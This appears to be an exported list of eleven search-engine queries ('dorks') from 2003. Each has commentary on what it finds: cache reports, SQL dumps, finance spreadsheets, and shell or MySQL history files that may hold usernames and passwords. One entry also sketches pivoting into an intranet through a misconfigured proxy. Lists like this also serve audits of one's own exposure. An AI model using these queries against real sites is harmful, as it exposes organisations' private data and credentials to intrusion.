&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;2&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Ganglia" "Cluster Report for"&quot;;&quot;These are server cluster reports, great for info gathering. Lesse, what were those server names again?&quot;
&quot;3&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" dbconvert.exe chats&quot;;&quot;ICQ (http://www.icq.com) allows you to store the contents of your online chats into a file. These folks have their entire ICQ directories online. On purpose?&quot;
&quot;4&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Apache HTTP Server" intitle:"documentation"&quot;;&quot;When you install the Apache web server, you get a nice set of online documentation. When you learn how to use Apache, your supposed to delete these online Apache manuals. These sites didn&#039;t. If they&#039;re in such a hurry with Apache installs, I wonder what else they rushed through?&quot;
&quot;5&quot;;&quot;2003-06-24&quot;;&quot;"Error Diagnostic Information" intitle:"Error Occurred While"&quot;;&quot;These aren&#039;t too horribly bad, but there are SO MANY of them. These sites got googlebotted while the site was having "technical difficulties." The resulting cached error message gives lots of juicy tidbits about the target site.&quot;
&quot;6&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" finance.xls&quot;;&quot;"Hey! I have a great idea! Let&#039;s put our finances on our website in a secret directory so we can get to it whenever we need to!"&quot;
&quot;7&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of finances.xls&quot;;&quot;"Hey! I have a great idea! Let&#039;s put our finances on our website in a secret directory so we can get to it whenever we need to!"&quot;
&quot;8&quot;;&quot;2003-06-24&quot;;&quot;"# Dumping data for table"&quot;;&quot;sQL database dumps. LOTS of data in these. So much data, infact, I&#039;m pressed to think of what else an ev1l hax0r would like to know about a target database.. What&#039;s that? Usernames and passwords you say? Patience, grasshopper.....&quot;
&quot;9&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of .bash_history&quot;;&quot;Ok, this file contains what a user typed at a shell command prompt. You shouldn&#039;t advertise this file. You shouldn&#039;t flash it to a web crawler. It contains COMMANDS and USERNAMES and stuff... *sigh* Sometimes there aren&#039;t words to describe how lame people can be. This particular theme can be carried further to find all sorts of things along these lines like .profile, .login, .logout files, etc. I just got bored with all the combinations...&quot;
&quot;10&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of .sh_history&quot;;&quot;Ok, this file contains what a user typed at a shell command prompt. You shouldn&#039;t advertise this file. You shouldn&#039;t flash it to a web crawler. It contains COMMANDS and USERNAMES and stuff... *sigh* Sometimes there aren&#039;t words to describe how lame people can be. This particular theme can be carried further to find all sorts of things along these lines like .profile, .login, .logout files, etc. I just got bored with all the combinations...&quot;
&quot;11&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" .mysql_history&quot;;&quot;The .mysql_history file contains commands that were performed against a mysql database. A "history" of said commands. First, you shouldn&#039;t show this file to anyone, especially not a MAJOR SEARCH ENGINE! Secondly, I sure hope you wouldn&#039;t type anything sensitive while interacting with your databases, like oh say USERNAMES AND PASSWORDS...&quot;
